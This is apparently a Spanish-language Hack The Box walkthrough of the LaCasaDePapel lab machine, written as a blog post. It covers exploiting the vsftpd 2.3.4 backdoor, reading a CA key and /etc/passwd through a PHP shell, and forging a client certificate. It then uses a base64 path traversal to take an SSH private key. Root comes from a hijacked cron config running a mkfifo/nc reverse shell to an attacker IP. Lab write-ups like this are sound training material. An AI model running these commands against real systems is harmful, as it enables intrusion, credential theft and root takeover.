---
layout: post
title: HTB_LaCasaDePapel
date: 2023/07/10
slug: HTB_LaCasaDePapel
heroImage: /assets/machines.jpg
---

# La Casa de Papel {-}

## Introduccion {-}

La maquina del dia se llama LaCasaDePapel.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/Pd-njw4ksnA/0.jpg)](https://www.youtube.com/watch?v=Pd-njw4ksnA)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.131
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.131
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.131 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,80,443 10.10.10.131 -oN targeted
```


| Puerto | Servicio | Que se nos occure?          | Que falta? |
| ------ | -------- | --------------------------- | ---------- |
| 21     | ftp      | anonymous                   |            |
| 22     | ssh      | Coneccion directa           |            |
| 80     | http     | Web Fuzzing                 |            |
| 443    | https    | Web Fuzzing                 |            |


Ya aqui podemos ver en el commonName del certificado ssl 
```bash
 lacasadepapel.htb 
```
 que añadimos al 
```bash
 /etc/hosts 
```


### Coneccion Anonoymous con ftp {-}

```bash
ftp 10.10.10.131

Name: anonymous
Password: 

530 Login incorrect.
```

No nos podemos conectar con el usuario anonymous, Pero podemos ver que el servicio es un vsFTPd 2.3.4 que ya sabemos que existe un exploit

```bash
searchsploit vsftpd 2.3.4

#Output
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.131
```

No vemos nada interesante aqui.

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.131 
```
, El wappalizer no nos muestra nada. Si entramos con el dominio 
```bash
 http://lacasadepapel.htb 
```
 vemos lo mismo.
Intentamos por **https** 
```bash
 https://lacasadepapel.htb 
```
 y aqui la cosa cambia. Tenemos un mensaje que dice que tenemos que proporcionar un certificado cliente
para ver mas cosas. Pero aqui necessitamos tener mas informaciones.
## Vulnerability Assessment {-}

### vsftpd 2.3.4 {-}

Como ya sabemos que esta version es vulnerable, buscando por internet o analyzando el exploit de Metasploit vemos que la vulnerabilidad
reside en poner una sonrisita 
```bash
 :) 
```
 al final del nombre de usuario y esto hace que se habre el puerto 6200 de la maquina.

```bash
nc 10.10.10.131 6200

#Output
Ncat: Connection refused.

telnet 10.10.10.131 21
USER s4vitar:)
PASS setenso
```

se queda bloqueado, podemos cerrar la ventana y con nc intentamos nuevamente la coneccion al puerto 6200.

```bash
nc 10.10.10.131 6200
```

Intentamos enviar commandos

```bash
whoami
#Error PHP Warning: Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP)
```

Intentamos commandos **PHP**

```bash
exec("whoami")
#error
shell_exec("whoami")
#error
passthru("whoami")
#error
system("whoami")
#error
help
#Output
help
ls
dump
doc
show
wtf
...
```

Vemos cosas intentamos con **ls** ver las variables classes funcciones y mas

```bash
ls
#Output
$tokyo
```

Miramos el contenido con show

```bash
show $tokyo
#output
class Tokyo {
    private function sign($caCert, $userCsr){
        ...
    }
}
```

Aqui vemos la class Tokyo con su funccion private. Podemos ver que en el directorio 
```bash
 /home/nairobi/ca.key 
```
 hay una key. Como este servicio
esta en php, miramos si podemos listar contenido de ficheros con las fucciones php 
```bash
 file_get_contents() 
```
, 
```bash
 scandir() 
```
 o 
```bash
 readfile() 
```


```bash
file_get_contents("/etc/passwd")
```

Y podemos ver el 
```bash
 /etc/passwd 
```
, miramos si podemos ver la key del usuario nairobi.

miramos si encontramos id_rsa

```bash
scandir("/")
scandir("/home")
scandir("/home/berlin/.ssh")
scandir("/home/nairobi/.ssh")
scandir("/home/oslo/.ssh")
scandir("/home/dali/.ssh")
scandir("/home/professor/.ssh")
```

No encontramos nada. Miramos el contenido del fichero key.

```bash
readfile("/home/nairobi/ca.key")
```

Ahora que tenemos la key podemos crear un certificado de cliente valido.

### Creamos un certificado de cliente valido {-}

1. Tenemos que recuperar el certificado del servidor

   ```bash
    openssl s_client -connect 10.10.10.131:443
    openssl s_client -connect 10.10.10.131:443 | openssl x509
    openssl s_client -connect 10.10.10.131:443 | openssl x509 > ca.cer
    ```

1. Copiamos el contenido del ca.key en un fichero ca.key

    - Aqui tenemos 2 ficheros el ca.key y el ca.cer

1. Con openssl creamos un private key

    ```bash
    openssl genrsa -out client.key 4096
    ```

1. Creamos un .req

    ```bash
    openssl req -new -key client.key -out client.req
    ```

    en commonName ponemos lacasadepapel.htb en el resto le damos al enter.

1. Firmamos el certificado

    ```bash
    openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer
    ```

    Aqui ya tenemos un certificado cliente valido. Pero ahora tenemos que convertirlo en un 
```bash
 .p12 
```
 para que los navegadores los accepten.

1. Conversion en certificado pkcs12 para navegadores

    ```bash
    openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
    chmod 777 client.p12
    ```


Aqui ya podemos añadir a firefox el certificado firmado. En firefox vamos a 
```bash
 ajustes 
```
 y buscamos por 
```bash
 cert 
```
. Damos a 
```bash
 Ver certificado 
```
 y en el menu 
```bash
 Sus certificados 
```

le podemos dar a 
```bash
 importar 
```
. Importamos el 
```bash
 client.p12 
```
 y le damos a acceptar. 

Si recargamos la pagina 
```bash
 https://lacasadepapel.htb 
```
 y acceptamos el certificado, ya podemos ver que el contenido a cambiado y un private arena es visible.

### Pathtraversal con base64 {-}

Aqui vemos dos Seasons y si le damos a una vemos unos ficheros 
```bash
 .avi 
```
 y haciendo hovering bemos que los nombres son en base64. Lo comprobamos con un fichero.

```bash
echo 'U0VBU09OLTEvMDMuYXZp' | base64 -d;echo
#Output
SEASON-1/03.avi
```

En la url vemos que tenemos algo como 
```bash
 https://lacasadepapel.htb/?path=SEASON-1 
```
. Miramos lo que pasa si le damos a 
```bash
 https://lacasadepapel.htb/?path=/etc/passwd 
```
 y
salta un error como no existe el path en 
```bash
 /home/berlin/download//etc/passwd 
```
 y que usa la funccion scandir para esto. Ya pensamos en un path traversal, pero como es
un scandir solo podemos ir a por directorios.

```bash
https://lacasadepapel.htb/?path=../
```

aqui vemos el user.txt.

```bash
echo -n '../user.txt' | base64
#Output
Li4vdXNlci50eHQ=
```

y si vamos ahora a la url 
```bash
 https://lacasadepapel.htb/file/Li4vdXNlci50eHQ= 
```
 vemos que podemos descargar el user.txt. Pero a nosotros nos interessa ganar accesso
al systema.

En la url 
```bash
 https://lacasadepapel.htb/?path=../ 
```
 vemos que podemos pinchar al directorio 
```bash
 .ssh 
```
 y a dentro hay una 
```bash
 id_rsa 
```
. Hacemos lo mismos que con el user.txt

## Vuln exploit & Gaining Access {-}

### SSH {-}

```bash
echo -n '../.ssh/id_rsa' | base64
#Output
Li4vLnNzaC9pZF9yc2E=
```

y con la url 
```bash
 https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E= 
```
 descargamos el fichero id_rsa.

```bash
mv /home/s4vitar/Descargas/firefox/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa berlin@10.10.10.131
```

como no va intentamos con los otros usuarios.

```bash
ssh -i id_rsa berlin@10.10.10.131
ssh -i id_rsa dali@10.10.10.131
ssh -i id_rsa nairobi@10.10.10.131
ssh -i id_rsa oslo@10.10.10.131
ssh -i id_rsa professor@10.10.10.131
```

Hemos ganado accesso al systema como el usuario professor.
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
ls
pwd
find / -name user.txt
cd /home/berlin/user.txt
```

Aqui vemos que el user.txt solo se puede ver desde la web.

```bash
uname -a
lsb_release
cat /etc/os-release
id
sudo -l
cd /
find \-perm -4000 2>/dev/null
```

aqui vemos binarios SUID. comprobamos con [gtfobins](https://gtfobins.github.io/) si se pueden burlar.

buscamos por bbsuid, abuild-sudo sudo pero no encontramos nada. Tenemos que mirar de CRON. Lo miramos con pspy.

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

Desde la maquina victima, downloadeamos el fichero y lo lanzamos

```bash
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

Podemos ver que hay una tarea ejecutada por root que lanza un 
```bash
 sudo -u nobody /usr/bin/node /home/professor/memcached.js 
```
 

Si vamos al 
```bash
 /home/professor 
```
 vemos el fichero 
```bash
 memcached.js 
```
 pero no nos deja ver lo que hay dentro. Hay otro fichero 
```bash
 memcached.ini 
```
 que contiene
el comando ejecutado durante la tarea cron. 

Aqui el truco es que aun que el fichero no se puedo modificar, como esta en nuestra carpeta HOME, lo podemos borrar.

```bash
rm memcached.ini
vi memcached.ini


[program:memcached]
command = sudo -u root /tmp/pwn.sh
```

aqui creamos el pwn.sh

```bash
cd /tmp
touch pwn.sh
chmod +x pwn.sh
vi pwn.sh

#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.80 443 >/tmp/f
```

nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Esperamos un poco y ganamos acceso al systema como root y podemos leer la flag.
